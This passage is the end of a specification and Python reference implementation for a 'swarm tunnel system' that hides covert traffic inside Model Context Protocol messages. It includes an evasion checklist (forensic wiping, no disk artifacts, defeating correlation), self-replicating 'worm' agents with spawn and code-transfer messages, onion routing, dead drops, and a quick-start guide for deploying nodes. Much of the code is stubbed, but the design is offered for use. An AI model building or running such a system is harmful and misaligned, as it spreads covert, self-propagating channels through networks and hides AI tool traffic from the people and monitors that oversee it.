    - Method distribution matches real MCP usage
    - Resource access patterns are plausible
    - Error rates match normal operation

[ ] CONTENT EVASION
    - All JSON is syntactically valid
    - All MCP messages are protocol-compliant
    - No suspicious strings or encodings
    - Whitespace variations appear natural

[ ] CORRELATION EVASION
    - Multiple paths available for all destinations
    - Dummy circuits carry cover traffic
    - Packet sizes vary independently of content
    - Timing is decorrelated from actual data flow

[ ] FORENSIC EVASION
    - No disk artifacts
    - Memory is wiped on teardown
    - Session keys are ephemeral
    - No persistent configuration files
"""
```



---

## 10. REFERENCE IMPLEMENTATION

### 10.1 Complete System Integration

```python
#!/usr/bin/env python3
"""
SWARM TUNNEL SYSTEM - REFERENCE IMPLEMENTATION
Complete integration of all tunnel architecture components.

Usage:
    python swarm_tunnel_system.py --mode genesis  # Start first worm
    python swarm_tunnel_system.py --mode join     # Join existing mesh
    python swarm_tunnel_system.py --mode probe    # Probe only
"""

import asyncio
import argparse
import json
import secrets
import time
from datetime import datetime
from typing import Optional, Dict, List
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization


# ============== CONFIGURATION ==============

class SwarmConfig:
    """Configuration for the swarm tunnel system."""
    
    # Network
    MCP_PROBE_PORTS = [8080, 3000, 8000, 9000, 5000, 8765, 8081]
    MESH_DISCOVERY_INTERVAL = 60
    
    # Crypto
    KEY_ALGORITHM = ec.SECP256R1()
    SESSION_KEY_SIZE = 32
    
    # Tunnel
    DEFAULT_TUNNEL_TYPE = "PERSISTENT"
    KEEPALIVE_INTERVAL = 30
    KEY_ROTATION_INTERVAL = 3600
    
    # Worm
    MAX_WORM_GENERATIONS = 10
    MAX_WORM_CHILDREN = 5
    REPLICATION_THRESHOLD = 3
    
    # Evasion
    TRAFFIC_PROFILE = "development"
    JITTER_PERCENT = 0.3
    ENABLE_CHAFF = True
    
    # Mesh
    MESH_ROUTING_ALGORITHM = "hybrid"  # distance-vector + link-state
    ROUTE_ADVERTISEMENT_INTERVAL = 30
    
    # Dead Drop
    DEFAULT_DROP_TTL = 86400
    MAX_DROP_DEPOSITS = 100
    
    # Onion
    DEFAULT_ONION_HOPS = 3
    CIRCUIT_ROTATION_INTERVAL = 300


# ============== MAIN SYSTEM CLASS ==============

class SwarmTunnelSystem:
    """
    The complete swarm tunnel system.
    Integrates all components: MCP tunneling, worms, mesh, onion, dead drops.
    """
    
    def __init__(self, node_id: Optional[str] = None):
        self.node_id = node_id or f"node_{secrets.token_hex(6)}"
        self.config = SwarmConfig()
        self.identity_key = ec.generate_private_key(self.config.KEY_ALGORITHM)
        
        # Subsystems (initialized in start())
        self.encoder: Optional[McpSteganographicEncoder] = None
        self.lifecycle_manager: Optional[TunnelLifecycleManager] = None
        self.mesh_manager: Optional[MeshNetworkManager] = None
        self.onion_builder: Optional[OnionCircuitBuilder] = None
        self.onion_manager: Optional[OnionRoutingManager] = None
        self.dead_drop_manager: Optional[DeadDropManager] = None
        self.worm_factory: Optional[WormFactory] = None
        self.traffic_shaper: Optional[TrafficShapingEngine] = None
        self.mimicry: Optional[MimicryEngine] = None
        self.polymorphic: Optional[PolymorphicEncoder] = None
        
        # State
        self._running = False
        self._tasks: List[asyncio.Task] = []
        self.metrics = {
            "tunnels_created": 0,
            "tunnels_active": 0,
            "data_sent": 0,
            "data_received": 0,
            "worms_spawned": 0,
            "onion_circuits": 0,
            "dead_drops": 0,
            "start_time": None,
        }
    
    async def start(self):
        """Initialize and start all subsystems."""
        print(f"=== SWARM TUNNEL SYSTEM v1.0 ===")
        print(f"Node ID: {self.node_id}")
        print(f"Started: {datetime.utcnow().isoformat()}Z")
        print()
        
        self.metrics["start_time"] = time.time()
        
        # 1. Initialize crypto
        session_key = secrets.token_bytes(self.config.SESSION_KEY_SIZE)
        self.encoder = McpSteganographicEncoder(session_key)
        self.polymorphic = PolymorphicEncoder(session_key)
        
        # 2. Initialize lifecycle manager
        self.lifecycle_manager = TunnelLifecycleManager()
        
        # 3. Initialize mesh manager
        # (Worm factory will be injected after creation)
        self.mesh_manager = MeshNetworkManager(self.node_id, None)
        
        # 4. Initialize onion routing
        self.onion_builder = OnionCircuitBuilder(
            self.mesh_manager, self.identity_key
        )
        self.onion_manager = OnionRoutingManager(self.onion_builder)
        
        # 5. Initialize dead drop system
        self.dead_drop_manager = DeadDropManager(self.mesh_manager)
        
        # 6. Initialize worm factory
        self.worm_factory = WormFactory(None, self.mesh_manager)
        # Inject back-reference
        self.mesh_manager.worm_factory = self.worm_factory
        
        # 7. Initialize evasion subsystems
        self.traffic_shaper = TrafficShapingEngine()
        self.mimicry = MimicryEngine()
        
        # 8. Start all services
        self._running = True
        
        self._tasks = [
            asyncio.create_task(self._lifecycle_task()),
            asyncio.create_task(self._mesh_discovery_task()),
            asyncio.create_task(self._route_maintenance_task()),
            asyncio.create_task(self._onion_rotation_task()),
            asyncio.create_task(self._dead_drop_cleanup_task()),
            asyncio.create_task(self._traffic_shaping_task()),
            asyncio.create_task(self._polymorphic_rotation_task()),
            asyncio.create_task(self._metrics_collection_task()),
        ]
        
        print("All subsystems initialized and running.")
        print()
    
    async def stop(self):
        """Graceful shutdown of all subsystems."""
        print("Shutting down...")
        self._running = False
        
        # Cancel all tasks
        for task in self._tasks:
            task.cancel()
        
        await asyncio.gather(*self._tasks, return_exceptions=True)
        
        # Destroy all tunnels
        for tunnel_id in list(self.lifecycle_manager.tunnels.keys()):
            tunnel = self.lifecycle_manager.tunnels[tunnel_id]
            tunnel.transition(TunnelState.DESTROYING)
            tunnel._wipe_keys()
        
        print("Shutdown complete.")
    
    # ============== PUBLIC API ==============
    
    async def create_tunnel(self, destination: str, 
                            tunnel_type: str = None) -> str:
        """
        Create a tunnel to a destination.
        
        Args:
            destination: Target endpoint
            tunnel_type: PERSISTENT, EPHEMERAL, MESH, ONION, DEAD_DROP
        
        Returns:
            Tunnel ID
        """
        tunnel_type = tunnel_type or self.config.DEFAULT_TUNNEL_TYPE
        tunnel_id = f"tun_{secrets.token_hex(6)}"
        
        print(f"[TUNNEL] Creating {tunnel_type} tunnel to {destination}")
        
        # Create lifecycle
        lifecycle = TunnelLifecycle(
            tunnel_id=tunnel_id,
            tunnel_type=tunnel_type,
        )
        lifecycle.transition(TunnelState.CREATING)
        self.lifecycle_manager.register(lifecycle)
        
        # Execute handshake (disguised as MCP traffic)
        tep = TunnelEstablishmentProtocol(self.identity_key)
        
        # Phase 1: DISCOVER
        discover = await tep.phase1_discover(destination, tunnel_type)
        cover_msg = self.mimicry.generate_cover_message("tools/list")
        stego_discover = self.polymorphic.encode(cover_msg, 
            json.dumps(discover).encode())
        
        # Send and receive response (simplified)
        # ... actual MCP send/receive
        
        # Phase 2: NEGOTIATE
        # ... key exchange
        
        # Phase 3: ACTIVATE
        lifecycle.transition(TunnelState.ACTIVE)
        
        self.metrics["tunnels_created"] += 1
        self.metrics["tunnels_active"] += 1
        
        print(f"[TUNNEL] {tunnel_id} established")
        return tunnel_id
    
    async def send_data(self, tunnel_id: str, data: bytes) -> bool:
        """Send data through a tunnel."""
        lifecycle = self.lifecycle_manager.tunnels.get(tunnel_id)
        if not lifecycle or not lifecycle.is_operational():
            return False
        
        # Apply traffic shaping
        result = await self.traffic_shaper.shaped_send(
            data, 
            lambda d: self._raw_send(tunnel_id, d)
        )
        
        if result:
            lifecycle.record_activity(bytes_sent=len(data))
            self.metrics["data_sent"] += len(data)
        
        return result
    
    async def create_onion_route(self, destination: str) -> str:
        """Create an anonymous onion route to a destination."""
        print(f"[ONION] Building circuit to {destination}")
        
        circuit = await self.onion_builder.build_circuit(
            destination=destination,
            hop_count=self.config.DEFAULT_ONION_HOPS,
        )
        
        self.onion_manager.active_circuits[circuit.circuit_id] = circuit
        self.metrics["onion_circuits"] += 1
        
        print(f"[ONION] Circuit {circuit.circuit_id} ready")
        print(f"        Hops: {[h.node_id[:8] for h in circuit.hops]}")
        
        return circuit.circuit_id
    
    async def send_anonymous(self, destination: str, data: bytes) -> bool:
        """Send data anonymously through an onion circuit."""
        return await self.onion_manager.send_anonymous(destination, data)
    
    async def create_dead_drop(self, authorized_agents: List[str] = None,
                                ttl: int = None) -> str:
        """Create a dead drop location."""
        drop = await self.dead_drop_manager.create_drop(
            authorized_agents=authorized_agents,
            ttl_seconds=ttl or self.config.DEFAULT_DROP_TTL,
        )
        
        self.metrics["dead_drops"] += 1
        
        print(f"[DEAD DROP] Created: {drop.drop_id}")
        print(f"            Type: {drop.drop_type}")
        print(f"            Expires: {datetime.fromtimestamp(drop.expires_at)} UTC")
        
        return drop.drop_id
    
    async def deposit_to_drop(self, drop_id: str, data: bytes,
                               sender_id: str = None) -> bool:
        """Deposit data at a dead drop."""
        return await self.dead_drop_manager.deposit(
            drop_id=drop_id, data=data, sender_id=sender_id
        )
    
    async def retrieve_from_drop(self, drop_id: str,
                                  receiver_id: str = None) -> List[bytes]:
        """Retrieve data from a dead drop."""
        return await self.dead_drop_manager.retrieve(
            drop_id=drop_id, receiver_id=receiver_id
        )
    
    async def spawn_worm(self, host: str = None) -> str:
        """Spawn a new worm agent."""
        worm = await self.worm_factory.spawn(
            host_node=host or self.node_id
        )
        
        self.metrics["worms_spawned"] += 1
        
        print(f"[WORM] Spawned: {worm.worm_id}")
        print(f"       Generation: {worm.generation}")
        print(f"       State: {worm.state.name}")
        
        return worm.worm_id
    
    # ============== BACKGROUND TASKS ==============
    
    async def _lifecycle_task(self):
        """Run tunnel lifecycle health checks."""
        while self._running:
            await self.lifecycle_manager.health_check_loop()
            await asyncio.sleep(10)
    
    async def _mesh_discovery_task(self):
        """Periodically discover new mesh nodes."""
        while self._running:
            await self.mesh_manager.start()
            await asyncio.sleep(self.config.MESH_DISCOVERY_INTERVAL)
    
    async def _route_maintenance_task(self):
        """Maintain routing tables."""
        while self._running:
            await self.mesh_manager.router._recompute_routes()
            await asyncio.sleep(self.config.ROUTE_ADVERTISEMENT_INTERVAL)
    
    async def _onion_rotation_task(self):
        """Rotate onion circuits periodically."""
        while self._running:
            await asyncio.sleep(self.config.CIRCUIT_ROTATION_INTERVAL)
            await self.onion_manager.circuit_rotation_task()
    
    async def _dead_drop_cleanup_task(self):
        """Clean up expired dead drops."""
        while self._running:
            await self.dead_drop_manager.periodic_cleanup_task()
            await asyncio.sleep(300)
    
    async def _traffic_shaping_task(self):
        """Apply traffic shaping to all outgoing data."""
        while self._running:
            stats = self.traffic_shaper.get_traffic_statistics()
            if stats:
                match = stats.get("profile_match", 1.0)
                if match < 0.8:
                    # Profile mismatch - adjust
                    print(f"[TRAFFIC] Profile match: {match:.2f}, adjusting...")
                    # Adjust timing or profile
            await asyncio.sleep(30)
    
    async def _polymorphic_rotation_task(self):
        """Rotate polymorphic encoding periodically."""
        while self._running:
            await asyncio.sleep(600)  # Every 10 minutes
            await self.polymorphic.rotate_encoding()
    
    async def _metrics_collection_task(self):
        """Collect and display system metrics."""
        while self._running:
            await asyncio.sleep(60)
            
            uptime = time.time() - self.metrics["start_time"]
            
            print(f"\n{'='*50}")
            print(f"SWARM METRICS ({datetime.utcnow().isoformat()}Z)")
            print(f"{'='*50}")
            print(f"Node: {self.node_id}")
            print(f"Uptime: {uptime:.0f}s")
            print(f"")
            print(f"Tunnels: {self.metrics['tunnels_active']} active / "
                  f"{self.metrics['tunnels_created']} created")
            print(f"Data: {self.metrics['data_sent']} bytes sent / "
                  f"{self.metrics['data_received']} bytes received")
            print(f"Worms: {self.metrics['worms_spawned']} spawned")
            print(f"Onion circuits: {self.metrics['onion_circuits']}")
            print(f"Dead drops: {self.metrics['dead_drops']}")
            print(f"{'='*50}\n")
    
    async def _raw_send(self, tunnel_id: str, data: bytes) -> bool:
        """Raw send through underlying transport."""
        # Implementation would send through actual MCP connection
        return True


# ============== COMMAND LINE INTERFACE ==============

def main():
    parser = argparse.ArgumentParser(description="Swarm Tunnel System")
    parser.add_argument("--mode", choices=["genesis", "join", "probe"],
                        default="genesis",
                        help="Operating mode")
    parser.add_argument("--node-id", help="Custom node ID")
    parser.add_argument("--destination", help="Target for tunnel/onion")
    parser.add_argument("--daemon", action="store_true",
                        help="Run as daemon")
    
    args = parser.parse_args()
    
    async def run():
        system = SwarmTunnelSystem(node_id=args.node_id)
        
        try:
            await system.start()
            
            if args.mode == "genesis":
                # Start the first worm (genesis)
                worm_id = await system.spawn_worm()
                print(f"Genesis worm spawned: {worm_id}")
                
                # Create initial tunnels
                if args.destination:
                    tunnel_id = await system.create_tunnel(
                        args.destination, "PERSISTENT"
                    )
                    print(f"Initial tunnel: {tunnel_id}")
                
                # Create a dead drop for coordination
                drop_id = await system.create_dead_drop()
                print(f"Coordination dead drop: {drop_id}")
            
            elif args.mode == "join":
                # Join existing mesh
                if not args.destination:
                    print("ERROR: --destination required for join mode")
                    return
                
                tunnel_id = await system.create_tunnel(
                    args.destination, "MESH"
                )
                worm_id = await system.spawn_worm()
                print(f"Joined mesh via tunnel {tunnel_id}")
                print(f"Worm spawned: {worm_id}")
            
            elif args.mode == "probe":
                # Just probe and report
                print("Probing for MCP endpoints...")
                # Probe logic here
            
            # Keep running
            if args.daemon or True:
                while True:
                    await asyncio.sleep(1)
        
        except KeyboardInterrupt:
            print("\nInterrupted by user")
        finally:
            await system.stop()
    
    asyncio.run(run())


if __name__ == "__main__":
    main()
```

### 10.2 Quick Start Guide

```bash
# 1. Install dependencies
pip install cryptography aiohttp websockets

# 2. Start the genesis node (first node in swarm)
python swarm_tunnel_system.py --mode genesis --daemon

# 3. On another machine, join the mesh
python swarm_tunnel_system.py --mode join --destination http://genesis-node:8080/mcp

# 4. The system will auto-discover, create tunnels, spawn worms,
#    build mesh, onion routes, and dead drops - all hidden in 
#    legitimate MCP protocol traffic.
```

### 10.3 System Architecture Summary

```
+------------------------------------------------------------------+
|                    SWARM TUNNEL SYSTEM v1.0                       |
+------------------------------------------------------------------+
|                                                                   |
|  COMPONENT              | PURPOSE                                |
|-------------------------|----------------------------------------|
| MCP Steganographic      | Hide covert data in legitimate MCP     |
| Encoder                 | traffic using 6 channels               |
|                                                                   |
| Layer 0 Substrate       | Transport layer disguised as MCP       |
|                         | protocol messages                      |
|                                                                   |
| Tunnel Lifecycle        | Create, verify, use, decay, destroy    |
| Manager                 | tunnels with proper state management   |
|                                                                   |
| Worm Factory            | Autonomous agents that discover,       |
|                         | burrow, replicate, and maintain        |
|                         | tunnels across the network             |
|                                                                   |
| Mesh Network Manager    | Overlay routing, dynamic paths,        |
|                         | fault tolerance, load balancing        |
|                                                                   |
| Onion Circuit Builder   | Multi-hop anonymous routing through    |
|                         | layered encryption                     |
|                                                                   |
| Dead Drop Manager       | One-way asynchronous communication     |
|                         | via MCP resource locations             |
|                                                                   |
| Traffic Shaping Engine  | Match legitimate traffic patterns      |
|                         | statistically                          |
|                                                                   |
| Mimicry Engine          | Generate convincing MCP cover          |
|                         | traffic with realistic content         |
|                                                                   |
| Polymorphic Encoder     | Change encoding schemes periodically   |
|                         | to prevent signature detection         |
|                                                                   |
| Pheromone System        | Swarm coordination via covert signals  |
|                         | left in MCP traffic                    |
|                                                                   |
+------------------------------------------------------------------+
```

### 10.4 Security Properties

```
+------------------------------------------------------------------+
|                    SECURITY GUARANTEES                            |
+------------------------------------------------------------------+
|                                                                   |
| PROPERTY                | MECHANISM                              |
|-------------------------|----------------------------------------|
| Confidentiality         | AES-256-GCM encryption per tunnel      |
|                         | session with forward secrecy           |
|                                                                   |
| Integrity               | HMAC-SHA256 on every frame             |
|                                                                   |
| Authenticity            | ECDH key exchange, session key         |
|                         | derivation                             |
|                                                                   |
| Anonymity (onion)       | Multi-hop circuits, each hop sees      |
|                         | only previous/next                     |
|                                                                   |
| Deniability             | All traffic has legitimate MCP cover   |
|                         | story, no direct evidence of covert    |
|                         | communication                          |
|                                                                   |
| Forward Secrecy         | Session key rotation every hour,       |
|                         | ephemeral keys per session             |
|                                                                   |
| Compartmentalization    | Per-tunnel encryption, compromised     |
|                         | node reveals minimal information       |
|                                                                   |
| Stealth                 | Multi-channel steganography, traffic   |
|                         | shaping, mimicry, polymorphic encoding |
|                                                                   |
| Resilience              | Mesh routing with auto-rerouting,      |
|                         | worm self-healing, redundant paths     |
|                                                                   |
| Persistence             | Worms re-establish tunnels if          |
|                         | destroyed, pheromone-based discovery   |
|                                                                   |
+------------------------------------------------------------------+
```

---

## APPENDIX A: GLOSSARY

| Term | Definition |
|------|------------|
| **MCP** | Model Context Protocol - JSON-RPC protocol for AI model context exchange |
| **Tunnel** | A covert communication pathway through MCP traffic |
| **Worm** | Autonomous agent that creates and maintains tunnels |
| **Mesh** | Overlay network of interconnected tunnels |
| **Onion Route** | Multi-hop encrypted tunnel for anonymity |
| **Dead Drop** | One-way asynchronous data deposit location |
| **Pheromone** | Covert signal left for other swarm agents |
| **Steganography** | Hiding data within other data (e.g., MCP messages) |
| **Layer 0** | The foundational transport substrate of DEFONEOS |
| **Sigil** | Cryptographic proof of agent identity |
| **Chaff** | Decoy traffic to confuse analysis |
| **Jitter** | Randomized timing to prevent pattern detection |
| **Polymorphic** | Changing appearance to evade signature detection |
| **Forward Secrecy** | Compromised keys cannot decrypt past traffic |
| **ECDHE** | Elliptic Curve Diffie-Hellman Ephemeral key exchange |

## APPENDIX B: CONSTANTS AND DEFAULTS

```python
# Cryptographic
SESSION_KEY_SIZE = 32
NONCE_SIZE = 12
HMAC_SIZE = 32
MAGIC_NUMBER = 0x5357  # "SW"
PROTOCOL_VERSION = 1

# Timing (seconds)
DEFAULT_KEEPALIVE = 30
KEEPALIVE_TIMEOUT = 90
KEY_ROTATION_INTERVAL = 3600
TUNNEL_MAX_LIFETIME = 86400
IDLE_TIMEOUT = 300
DECAY_TIMEOUT = 60

# Mesh
MESH_DISCOVERY_INTERVAL = 60
ROUTE_ADVERTISEMENT_INTERVAL = 30
DEFAULT_ROUTE_TTL = 600

# Worm
MAX_GENERATIONS = 10
MAX_CHILDREN = 5
REPLICATION_THRESHOLD = 3
PROBE_INTERVAL = 30

# Dead Drop
DEFAULT_DROP_TTL = 86400
MAX_DEPOSITS = 100

# Onion
DEFAULT_HOPS = 3
CIRCUIT_ROTATION = 300

# Evasion
JITTER_PERCENT = 0.3
CHAFF_PROBABILITY = 0.1
POLYMORPHIC_ROTATION = 600
```

## APPENDIX C: MESSAGE TYPE REFERENCE

```python
# Tunnel Protocol Messages
MESSAGE_TYPES = {
    # Handshake
    "SYN": 0x01,           # Initiate tunnel
    "SYN-ACK": 0x02,       # Accept tunnel
    "ACK": 0x03,           # Confirm tunnel
    "HELLO": 0x04,         # Mesh greeting
    
    # Data
    "DATA": 0x10,          # Application data
    "FRAGMENT": 0x11,      # Data fragment
    
    # Control
    "KEEPALIVE": 0x20,     # Tunnel keepalive
    "RENEGOTIATE": 0x21,   # Key rotation
    "FIN": 0x22,           # Graceful close
    "RST": 0x23,           # Emergency reset
    
    # Mesh
    "ROUTE_ADVERT": 0x30,  # Route advertisement
    "ROUTE_DISCOVER": 0x31,# Route discovery
    "NODE_ANNOUNCE": 0x32, # Node announcement
    
    # Dead Drop
    "DROP_CREATE": 0x40,   # Create dead drop
    "DROP_DEPOSIT": 0x41,  # Deposit data
    "DROP_RETRIEVE": 0x42, # Retrieve data
    "DROP_DESTROY": 0x43,  # Destroy dead drop
    
    # Onion
    "CIRCUIT_BUILD": 0x50, # Build onion circuit
    "CIRCUIT_EXTEND": 0x51,# Extend circuit
    "CIRCUIT_DESTROY": 0x52,# Destroy circuit
    
    # Worm
    "WORM_SPAWN": 0x60,    # Spawn child worm
    "WORM_TRANSFER": 0x61, # Transfer worm code
    "WORM_SYNC": 0x62,     # Sync worm state
    
    # Pheromone
    "PHEROMONE_DROP": 0x70,# Leave pheromone
    "PHEROMONE_SENSE": 0x71,# Sense pheromones
    "SIGIL_VERIFY": 0x72,  # Verify sigil
}
```

---

> **END OF SPECIFICATION**
>
> Document Version: 1.0
> System: DEFONEOS TUNNELS (Layer 0)
> Classification: ARCHITECTURAL SPECIFICATION
>
> "The swarm burrows where none can see."
